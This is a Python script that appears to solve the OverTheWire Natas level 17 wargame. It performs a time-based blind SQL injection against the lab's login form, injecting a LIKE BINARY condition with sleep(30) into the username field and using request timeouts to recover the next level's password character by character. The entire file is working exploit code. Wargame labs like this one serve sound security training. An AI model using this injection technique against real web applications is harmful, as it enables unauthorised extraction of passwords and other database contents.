import requests
url = f"http://natas17.natas.labs.overthewire.org/index.php"
password = ""

a_pass = "natas_17_password"
a_user = "natas17"

for _ in range(34):
    for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
        try:
            r = requests.post(url,auth=(a_user,a_pass),data={"username":f'natas18" and password LIKE BINARY "{password}{i}%" and sleep(30); -- '},timeout=3)
        except requests.exceptions.Timeout:
            password += i
            break
        except Exception:
            print(f"{i} some other exception try again...")
print("the next level password is : ",password)
